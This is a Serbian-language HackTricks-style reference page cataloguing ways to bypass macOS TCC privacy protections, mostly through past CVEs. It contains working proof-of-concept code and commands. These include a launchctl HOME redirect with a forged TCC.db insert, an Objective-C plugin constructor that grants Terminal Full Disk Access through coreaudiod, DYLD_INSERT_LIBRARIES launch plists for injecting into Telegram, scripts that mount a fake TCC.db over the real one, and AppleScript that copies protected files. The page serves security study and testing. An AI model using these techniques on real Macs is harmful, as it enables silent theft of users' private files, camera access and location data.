# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Po funkcionalnosti

### Write Bypass

Ovo nije zaobilaženje, to je samo način na koji TCC funkcioniše: **Ne štiti od pisanja**. Ako Terminal **nema pristup da pročita Desktop korisnika, i dalje može da piše u njega**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Proširena atribut `com.apple.macl`** se dodaje novom **fajlu** kako bi se **aplikaciji kreatora** omogućio pristup za čitanje.

### TCC ClickJacking

Moguće je **staviti prozor preko TCC prompta** kako bi korisnik **prihvatio** to bez da primeti. Možete pronaći PoC u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Zahtev po proizvoljnom imenu

Napadač može **napraviti aplikacije sa bilo kojim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** i učiniti da zatraži pristup nekoj TCC zaštićenoj lokaciji. Korisnik će pomisliti da je legitimna aplikacija ta koja traži ovaj pristup.\
Štaviše, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i staviti lažnu umesto nje**, tako da kada korisnik klikne na lažnu (koja može koristiti istu ikonu) može pozvati legitimnu, zatražiti TCC dozvole i izvršiti malware, navodeći korisnika da veruje da je legitimna aplikacija tražila pristup.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC u:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Podrazumevano, pristup putem **SSH je imao "Full Disk Access"**. Da biste onemogućili ovo, potrebno je da bude navedeno, ali onemogućeno (uklanjanje sa liste neće ukloniti te privilegije):

![](<../../../../../images/image (1077).png>)

Ovde možete pronaći primere kako su neki **malware-ovi uspeli da zaobiđu ovu zaštitu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Imajte na umu da sada, da biste mogli da omogućite SSH, potrebna vam je **Full Disk Access**

### Rukovanje ekstenzijama - CVE-2022-26767

Atribut **`com.apple.macl`** se dodeljuje fajlovima kako bi se **određenoj aplikaciji omogućile dozvole za čitanje.** Ovaj atribut se postavlja kada se **prevuče i ispusti** fajl preko aplikacije, ili kada korisnik **duplo klikne** na fajl da bi ga otvorio sa **podrazumevanom aplikacijom**.

Stoga, korisnik može **registrovati zloćudnu aplikaciju** da rukuje svim ekstenzijama i pozvati Launch Services da **otvori** bilo koji fajl (tako da će zloćudni fajl dobiti pristup za čitanje).

### iCloud

Pravo **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC servisom koji će **obezbediti iCloud tokene**.

**iMovie** i **Garageband** su imale ovo pravo i druge koje su to omogućavale.

Za više **informacija** o eksploatu za **dobijanje iCloud tokena** iz tog prava, pogledajte predavanje: [**#OBTS v5.0: "Šta se dešava na vašem Mac-u, ostaje na Apple-ovom iCloud-u?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatizacija

Aplikacija sa **`kTCCServiceAppleEvents`** dozvolom će moći da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi dozvole dodeljene drugim aplikacijama**.

Za više informacija o Apple skriptama, pogledajte:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na primer, ako aplikacija ima **dozvolu za automatizaciju nad `iTerm`**, na primer u ovom primeru **`Terminal`** ima pristup nad iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Preko iTerm

Terminal, koji nema FDA, može pozvati iTerm, koji ima, i koristiti ga za izvršavanje radnji:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Preko Findera

Ili ako aplikacija ima pristup preko Findera, to bi mogla biti skripta poput ove:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Po ponašanju aplikacije

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Korisnički **tccd daemon** koristi **`HOME`** **env** promenljivu za pristup TCC korisničkoj bazi podataka iz: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovom Stack Exchange postu](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i zato što TCC daemon radi putem `launchd` unutar domena trenutnog korisnika, moguće je **kontrolisati sve promenljive okruženja** koje se prosleđuju njemu.\
Tako, **napadač može postaviti `$HOME` promenljivu okruženja** u **`launchctl`** da pokazuje na **kontrolisanu** **direktoriju**, **ponovo pokrenuti** **TCC** daemon, i zatim **direktno izmeniti TCC bazu podataka** da sebi dodeli **svako TCC pravo koje je dostupno** bez ikakvog obaveštavanja krajnjeg korisnika.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Beleške

Beleške su imale pristup TCC zaštićenim lokacijama, ali kada se kreira beleška, ona se **kreira u nezaštićenoj lokaciji**. Dakle, mogli biste tražiti od beleški da kopiraju zaštićenu datoteku u belešku (tako u nezaštićenoj lokaciji) i zatim pristupiti datoteci:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokacija

Binarni fajl `/usr/libexec/lsd` sa bibliotekom `libsecurity_translocate` imao je pravo `com.apple.private.nullfs_allow` koje mu je omogućilo da kreira **nullfs** montiranje i imao je pravo `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`** za pristup svakoj datoteci.

Bilo je moguće dodati atribut karantina na "Biblioteku", pozvati **`com.apple.security.translocation`** XPC servis i tada bi se Biblioteka mapirala na **`$TMPDIR/AppTranslocation/d/d/Library`** gde su svi dokumenti unutar Biblioteke mogli biti **pristupani**.

### CVE-2023-38571 - Muzika i TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muzika`** ima zanimljivu funkciju: Kada se pokrene, **uvozi** datoteke koje su bačene u **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** u korisničku "medijsku biblioteku". Štaviše, poziva nešto poput: **`rename(a, b);`** gde su `a` i `b`:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Ovo **`rename(a, b);`** ponašanje je ranjivo na **Race Condition**, jer je moguće staviti lažni **TCC.db** fajl unutar foldera `Automatically Add to Music.localized` i zatim, kada se novi folder (b) kreira, kopirati datoteku, obrisati je i usmeriti je na **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Ako je **`SQLITE_SQLLOG_DIR="path/folder"`**, to u suštini znači da se **baza podataka koja je otvorena kopira na tu putanju**. U ovom CVE-u ova kontrola je zloupotrebljena da se **piše** unutar **SQLite baze podataka** koja će biti **otvorena od strane procesa sa FDA TCC bazom podataka**, a zatim zloupotrebljena **`SQLITE_SQLLOG_DIR`** sa **symlink-om u imenu fajla** tako da kada je ta baza podataka **otvorena**, korisnička **TCC.db se prepisuje** sa otvorenom.\
**Više informacija** [**u izveštaju**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **i**[ **u predavanju**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Ako je promenljiva okruženja **`SQLITE_AUTO_TRACE`** postavljena, biblioteka **`libsqlite3.dylib`** će početi da **beleži** sve SQL upite. Mnoge aplikacije su koristile ovu biblioteku, tako da je bilo moguće beležiti sve njihove SQLite upite.

Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup TCC zaštićenim informacijama.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Ova **env varijabla se koristi od strane `Metal` framework-a** koji je zavisnost raznih programa, najistaknutije `Music`, koji ima FDA.

Postavljanje sledećeg: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Ako je `path` važeći direktorijum, greška će se aktivirati i možemo koristiti `fs_usage` da vidimo šta se dešava u programu:

- fajl će biti `open()`ovan, nazvan `path/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
- jedan ili više `write()` će napisati sadržaj u fajl (mi to ne kontrolišemo)
- `path/.dat.nosyncXXXX.XXXXXX` će biti `renamed()` u `path/name`

To je privremeno pisanje fajla, praćeno **`rename(old, new)`** **koje nije sigurno.**

Nije sigurno jer mora **da razreši stare i nove putanje odvojeno**, što može potrajati i može biti ranjivo na Race Condition. Za više informacija možete proveriti `xnu` funkciju `renameat_internal()`.

> [!CAUTION]
> Dakle, u suštini, ako privilegovani proces preimenuje iz foldera koji kontrolišete, mogli biste dobiti RCE i učiniti da pristupi drugom fajlu ili, kao u ovom CVE-u, otvoriti fajl koji je privilegovana aplikacija kreirala i sačuvati FD.
>
> Ako preimenovanje pristupa folderu koji kontrolišete, dok ste izmenili izvorni fajl ili imate FD za njega, menjate odredišni fajl (ili folder) da pokazuje na symlink, tako da možete pisati kad god želite.

Ovo je bio napad u CVE: Na primer, da bismo prepisali korisnikov `TCC.db`, možemo:

- kreirati `/Users/hacker/ourlink` da pokazuje na `/Users/hacker/Library/Application Support/com.apple.TCC/`
- kreirati direktorijum `/Users/hacker/tmp/`
- postaviti `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- aktivirati grešku pokretanjem `Music` sa ovom env varijablom
- uhvatiti `open()` od `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
- ovde takođe `open()`ujemo ovaj fajl za pisanje, i zadržavamo deskriptor fajla
- atomatski zameniti `/Users/hacker/tmp` sa `/Users/hacker/ourlink` **u petlji**
- radimo to da bismo maksimizovali naše šanse za uspeh jer je prozor trke prilično mali, ali gubitak trke ima zanemarljiv nedostatak
- sačekati malo
- testirati da li smo imali sreće
- ako ne, ponovo pokrenuti od vrha

Više informacija na [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Sada, ako pokušate da koristite env varijablu `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacije se neće pokrenuti

### Apple Remote Desktop

Kao root mogli biste omogućiti ovu uslugu i **ARD agent će imati pun pristup disku** koji bi zatim mogao biti zloupotrebljen od strane korisnika da napravi kopiju nove **TCC korisničke baze podataka**.

## Preko **NFSHomeDirectory**

TCC koristi bazu podataka u korisnikovom HOME folderu da kontroliše pristup resursima specifičnim za korisnika na **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Stoga, ako korisnik uspe da ponovo pokrene TCC sa $HOME env varijablom koja pokazuje na **drugi folder**, korisnik bi mogao da kreira novu TCC bazu podataka u **/Library/Application Support/com.apple.TCC/TCC.db** i prevari TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.

> [!TIP]
> Imajte na umu da Apple koristi podešavanje smešteno unutar korisničkog profila u **`NFSHomeDirectory`** atributu za **vrednost `$HOME`**, tako da ako kompromitujete aplikaciju sa dozvolama za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), možete **naoružati** ovu opciju sa TCC zaobiđenjem.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) da izmeni **HOME** folder korisnika.

1. Dobiti _csreq_ blob za ciljan app.
2. Posaditi lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blobom.
3. Izvesti korisnikov Directory Services unos sa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmeniti Directory Services unos da promeni korisnikov home direktorijum.
5. Uvesti izmenjeni Directory Services unos sa [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustaviti korisnikov _tccd_ i ponovo pokrenuti proces.

Drugi POC je koristio **`/usr/libexec/configd`** koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa **`-t`** opcijom, napadač bi mogao da specificira **prilagođeni Bundle za učitavanje**. Stoga, eksploatacija **menja** **`dsexport`** i **`dsimport`** metodu promene korisnikovog home direktorijuma sa **`configd` kod injekcijom**.

Za više informacija proverite [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Preko injekcije procesa

Postoje različite tehnike za injekciju koda unutar procesa i zloupotrebu njegovih TCC privilegija:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Štaviše, najčešća injekcija procesa za zaobilaženje TCC-a koja je pronađena je putem **pluginova (load library)**.\
Pluginovi su dodatni kod obično u obliku biblioteka ili plist, koji će biti **učitani od strane glavne aplikacije** i izvršavaće se pod njenim kontekstom. Stoga, ako je glavna aplikacija imala pristup TCC ograničenim fajlovima (putem dodeljenih dozvola ili prava), **prilagođeni kod će takođe imati pristup**.

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je pravo **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala je pluginove sa **`.daplug`** ekstenzijom i **nije imala** pojačanu runtime zaštitu.

Da bi se naoružao ovaj CVE, **`NFSHomeDirectory`** je **promenjen** (zloupotrebljavajući prethodno pravo) kako bi mogao da **preuzme korisnikov TCC bazu podataka** za zaobilaženje TCC-a.

Za više informacija proverite [**originalni izveštaj**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binarni fajl **`/usr/sbin/coreaudiod`** imao je prava `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvo **dozvoljava injekciju koda** a drugo mu daje pristup da **upravlja TCC-om**.

Ovaj binarni fajl je omogućio učitavanje **pluginova trećih strana** iz foldera `/Library/Audio/Plug-Ins/HAL`. Stoga, bilo je moguće **učitati plugin i zloupotrebiti TCC dozvole** sa ovim PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Sistemske aplikacije koje otvaraju kameru putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **u procesu ove plug-inove** smeštene u `/Library/CoreMediaIO/Plug-Ins/DAL` (nije pod SIP restrikcijama).

Samo čuvanje biblioteke sa zajedničkim **konstruktorom** će raditi za **injektovanje koda**.

Nekoliko Apple aplikacija je bilo ranjivo na ovo.

### Firefox

Aplikacija Firefox je imala `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables` privilegije:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Za više informacija o tome kako lako iskoristiti ovo [**proverite originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je ovlašćenja **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućilo injektovanje koda unutar procesa i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao ovlašćenja **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, tako da je bilo moguće zloupotrebiti to da **dobijete pristup njegovim dozvolama** kao što je snimanje kamerom. Možete [**pronaći payload u izveštaju**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Napomena kako koristiti env varijablu za učitavanje biblioteke, **custom plist** je kreiran za injektovanje ove biblioteke i **`launchctl`** je korišćen za pokretanje:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Kroz otvorene invokacije

Moguće je pozvati **`open`** čak i dok je u sandboxu

### Terminal skripte

Uobičajeno je dati terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički ljudi. I moguće je pozvati **`.terminal`** skripte koristeći to.

**`.terminal`** skripte su plist datoteke kao što je ova sa komandom za izvršavanje u **`CommandString`** ključiću:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacija može napisati terminalski skript na lokaciji kao što je /tmp i pokrenuti ga sa komandom kao što je:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montiranjem

### CVE-2020-9771 - mount_apfs TCC zaobilaženje i eskalacija privilegija

**Bilo koji korisnik** (čak i oni bez privilegija) može da kreira i montira snapshot vremenske mašine i **pristupi SVIM datotekama** tog snapshot-a.\
**Jedina privilegija** koja je potrebna je da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (FDA) pristup (`kTCCServiceSystemPolicyAllfiles`) koji mora biti odobren od strane administratora.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Detaljnije objašnjenje može se [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montiranje preko TCC datoteke

Čak i ako je TCC DB datoteka zaštićena, bilo je moguće **montirati novu TCC.db datoteku** preko direktorijuma:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Proverite **potpunu eksploataciju** u [**originalnom izveštaju**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Alat **`/usr/sbin/asr`** omogućava kopiranje celog diska i montiranje na drugom mestu, zaobilazeći TCC zaštite.

### Usluge lokacije

Postoji treća TCC baza podataka u **`/var/db/locationd/clients.plist`** koja označava klijente kojima je dozvoljen **pristup uslugama lokacije**.\
Folder **`/var/db/locationd/` nije bio zaštićen od DMG montiranja**, tako da je bilo moguće montirati naš vlastiti plist.

## Preko aplikacija pri pokretanju

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Preko grepa

U nekoliko slučajeva, fajlovi će čuvati osetljive informacije kao što su emailovi, brojevi telefona, poruke... na nezaštićenim lokacijama (što se smatra ranjivošću u Apple-u).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Sintetički klikovi

Ovo više ne funkcioniše, ali je [**funkcionisalo u prošlosti**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Drugi način koristeći [**CoreGraphics događaje**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referenca

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ načina da zaobiđete mehanizme privatnosti vašeg macOS-a**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout pobeda protiv TCC - 20+ NOVIH načina da zaobiđete mehanizme privatnosti vašeg MacOS-a**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
